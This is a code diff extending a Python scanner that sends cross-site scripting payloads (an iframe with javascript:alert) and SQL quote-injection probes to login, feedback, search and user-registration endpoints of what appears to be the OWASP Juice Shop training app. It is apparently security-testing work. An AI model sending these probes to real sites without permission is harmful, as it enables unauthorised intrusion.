@@ -24,7 +24,10 @@ def scan_endpoints():
     endpoints = [
         {"endpoint": "/rest/user/login", "command": "POST", "payload": "{\"email\": \"<iframe src=javascript:alert(1)>\", \"password\": \"any_password\"}"},
         {"endpoint": "/track-result?id=", "command": "GET", "payload": "';"},
-        {"endpoint": "/rest/products/search?q=", "command": "GET", "payload": "';"}
+        {"endpoint": "/rest/products/search?q=", "command": "GET", "payload": "';"},
+        {"endpoint": "/api/Feedbacks/", "command": "POST", "payload": "{\"captchaId\": 0,\"captcha\": \"-3\",\"comment\": \"<iframe src=javascript:alert(1)>\",\"rating\": 2}"}, 
+        {"endpoint": "/api/Users/", "command": "POST", "payload" : "{\"securityAnswer\": \"';'\", \"email\": \"test@example.com\", \"password\": \"password\", \"passwordRepeat\": \"password\",\"securityQuestion\": {\"id\": 2, \"question\": \"Mother's maiden name?\", \"createdAt\": \"2026-02-18T02:35:53.861Z\",\"updatedAt\": \"2026-02-18T02:35:53.861Z\"}}"},
+        {"endpoint": "/api/Users/", "command": "POST", "payload" : "{\"securityAnswer\": \"<iframe src=javascript:alert(1)>\", \"email\": \"test@example.com\", \"password\": \"password\", \"passwordRepeat\": \"password\",\"securityQuestion\": {\"id\": 2, \"question\": \"Mother's maiden name?\", \"createdAt\": \"2026-02-18T02:35:53.861Z\",\"updatedAt\": \"2026-02-18T02:35:53.861Z\"}}"}
     ]
 
     print(f"{'Endpoint':<30} | {'HTTP Method':<15} | {'Payload':<80} | {'Status Code':<15} | {'Response Length':<15}")
@@ -33,7 +36,10 @@ def scan_endpoints():
     for endpoint in endpoints:
         response = send_request(endpoint["endpoint"], endpoint["command"], endpoint["payload"])
         if response is not None:
-            print(f"{endpoint['endpoint']:<30} | {endpoint['command']:<15} | {endpoint['payload']:<80} | {response.status_code:<15} | {len(response.text):<15}")
+            payload_display = endpoint['payload']
+            if len(payload_display) > 77:
+                payload_display = payload_display[:77] + "..."
+            print(f"{endpoint['endpoint']:<30} | {endpoint['command']:<15} | {payload_display:<80} | {response.status_code:<15} | {len(response.text):<15}")
 
 if __name__ == '__main__':
     scan_endpoints()
